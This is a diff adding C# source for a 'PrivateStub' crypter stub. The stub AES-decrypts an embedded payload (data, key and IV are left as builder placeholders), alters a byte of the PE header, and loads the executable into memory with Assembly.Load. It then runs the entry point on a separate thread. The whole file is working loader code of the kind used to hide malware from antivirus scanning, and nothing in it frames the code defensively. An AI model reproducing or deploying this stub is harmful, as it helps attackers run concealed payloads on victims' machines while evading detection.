@@ -1,0 +1,117 @@
+﻿using System;
+using System.Text;
+using System.Security.Cryptography;
+using System.IO;                // For MemoryStream
+using System.Runtime.InteropServices;
+using System.Reflection;
+using System.Threading;
+using System.Security.Permissions;
+
+namespace PrivateStub
+{
+    public class Stub
+    {
+
+        private static readonly byte[] EncryptedData = /*ENCRYPTED_DATA*/;
+        private static readonly byte[] Key = /*KEY*/;
+        private static readonly byte[] IV = /*IV*/;
+        
+        public static void Main()
+        {
+            byte[] decryptedData = Decrypt(EncryptedData, Key, IV);
+
+            // for debugging 
+            /*
+            foreach(byte b in decryptedData)
+            {
+                Console.Write($"{b:X2}");
+            }
+
+            Console.WriteLine("\n input to continue \n");
+            Console.ReadLine();
+            */
+
+            ProjectorPE.Run(decryptedData);
+            
+
+        }
+
+        public static byte[] Decrypt(byte[] encrypted, byte[] key, byte[] iv)
+        {
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = key;
+                aesAlg.IV = iv;
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream msDecrypt = new MemoryStream(encrypted))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        byte[] decryptedBytes = new byte[encrypted.Length];
+                        int bytesRead = csDecrypt.Read(decryptedBytes, 0, decryptedBytes.Length);
+                        return decryptedBytes;
+                    }
+                }
+            }
+        }
+    }
+
+    public static class ProjectorPE
+    {
+        delegate object ExecuteAssembly(object sender, object[] parameters);
+
+        public static void Run(byte[] buffer)
+        {
+            // Removed PE header modification
+            int e_lfanew = BitConverter.ToInt32(buffer, 0x3c);
+            Buffer.SetByte(buffer, e_lfanew + 0x398, 2);
+
+            object[] parameters = null;
+
+            Assembly assembly = Assembly.Load(buffer);
+            MethodInfo entrypoint = assembly.EntryPoint;
+            if (entrypoint.GetParameters().Length > 0)
+            {
+                parameters = new object[] { new string[] { null } };
+            }
+
+            Thread assemblyExecuteThread = new Thread(() =>
+            {
+                Thread.BeginThreadAffinity();
+                Thread.BeginCriticalRegion();
+
+                ExecuteAssembly executeAssembly = new ExecuteAssembly(entrypoint.Invoke);
+                executeAssembly(null, parameters);
+
+                Thread.EndCriticalRegion();
+                Thread.EndThreadAffinity();
+            });
+
+            if (parameters != null && parameters.Length > 0)
+            {
+                assemblyExecuteThread.SetApartmentState(ApartmentState.STA);
+            }
+            else
+            {
+                assemblyExecuteThread.SetApartmentState(ApartmentState.MTA);
+            }
+
+            assemblyExecuteThread.Start();
+        }
+
+        public static void Run(string strBuffer)
+        {
+            byte[] buffer = Unwrap(strBuffer);
+            Run(buffer);
+        }
+
+        private static byte[] Unwrap(string buffer)
+        {
+            byte[] assemblyByteBuffer = new byte[buffer.Length];
+            for (int i = 0; i < buffer.Length; i++)
+                assemblyByteBuffer[i] = (byte)buffer[i];
+            return assemblyByteBuffer;
+        }
+    }
+}
